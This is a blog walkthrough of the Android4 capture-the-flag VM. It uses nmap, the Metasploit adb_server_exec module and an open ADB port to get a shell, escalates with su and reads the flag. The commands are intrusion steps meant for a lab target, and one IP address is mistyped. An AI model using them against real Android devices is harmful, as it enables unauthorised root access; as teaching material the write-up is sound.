@@ -1,0 +1,285 @@
+
+								
+																		Hack the Android4: Walkthrough (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on August 26, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello everyone and welcome to yet another CTF challenge walkthrough. This time we’ll be putting our hands on Android4 which is made by Touhid Shaikh. You can find the link to download this vulnerable VM here (https://www.vulnhub.com/entry/android4-1,233/).
+The level of this vulnerable VM, that I would rate: beginner.
+Steps involved:
+
+Port scanning and IP discovery.
+Attacking port 8080 proxy using adb_server_exec
+Connection to the device using ADB.
+Shell grabbing.
+Privilege escalation and reading congratulatory flag.
+
+Let’s get started then!
+First, we’ll grab the IP address using netdiscover utility present in Kali Linux.
+
+		
+		
+			
+			
+			
+			
+netdiscover
+			
+				
+					
+				
+					1
+				
+						netdiscover
+					
+				
+			
+		
+
+
+In my case, the IP address is 192.168.1.105
+The second step is as usual as port scanning. In this scan, we’ll be using an all port aggressive scan using the most popular tool nmap.
+
+		
+		
+			
+			
+			
+			
+nmap -p- -A 192.168.1.105
+			
+				
+					
+				
+					1
+				
+						nmap -p- -A 192.168.1.105
+					
+				
+			
+		
+
+ 
+From this, we established that there is some kind of web page related to the port 8080.
+Without any delay, we opened the webpage but found nothing.
+
+Anyone would establish that there is some kind of verbal tampering involved using the POST method. We tried but didn’t find anything useful.
+After trying a few other methods (PHP CLI and Dropbear RCE) here is one method that we found the best for our cause.
+
+Android Debug Bridge (ADB) is a versatile command-line tool that lets you communicate with a device. The adb command facilitates a variety of device actions, such as installing and debugging apps, and it provides access to a Unix shell that you can use to run a variety of commands on a device. It is a client-server program that includes three components:
+
+A client, which sends commands. The client runs on your development machine. You can invoke a client from a command-line terminal by issuing an adb command.
+A daemon (adbd), which runs commands on a device. The daemon runs as a background process on each device.
+A server, which manages communication between the client and the daemon. The server runs as a background process on your development machine.
+
+When you start an adb client, the client first checks whether there is an adb server process already running. If there isn’t, it starts the server process
+To start an ADB server we used Metasploit:
+
+		
+		
+			
+			
+			
+			
+use exploit/android/adb/adb_server_exec
+set RHOST 192.68.1.105
+set LHOST 192.168.1.106
+set LPORT 3333
+exploit
+			
+				
+					
+				
+					12345
+				
+						use exploit/android/adb/adb_server_execset RHOST 192.68.1.105set LHOST 192.168.1.106set LPORT 3333exploit
+					
+				
+			
+		
+
+(It is quite possible that the local port won’t accept a connection. In such a case, we change the default port from 4444 to 3333s)
+
+If you don’t have adb installed you can install it by sudo apt-get install adb
+
+Once the status shows “Connecting to the device, ” on a new terminal window type the command:
+
+		
+		
+			
+			
+			
+			
+adb connect 192.168.1.105:5555
+adb shell
+			
+				
+					
+				
+					12
+				
+						adb connect 192.168.1.105:5555adb shell
+					
+				
+			
+		
+
+In shell:
+ls
+
+to go to the default directory:
+
+		
+		
+			
+			
+			
+			
+cd
+su
+			
+				
+					
+				
+					12
+				
+						cdsu
+					
+				
+			
+		
+
+Voila! We got a root shell!
+
+ In /data directory we found a folder called “root”
+
+		
+		
+			
+			
+			
+			
+cd /data
+ls
+			
+				
+					
+				
+					12
+				
+						cd /datals
+					
+				
+			
+		
+
+The final step was reading the congratulatory flag:
+
+		
+		
+			
+			
+			
+			
+cd /root
+ls
+cat flag.txt
+			
+				
+					
+				
+					123
+				
+						cd /rootlscat flag.txt
+					
+				
+			
+		
+
+ 
+Author: Harshit Rajpal is an InfoSec researcher and a left and right brain thinker. contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
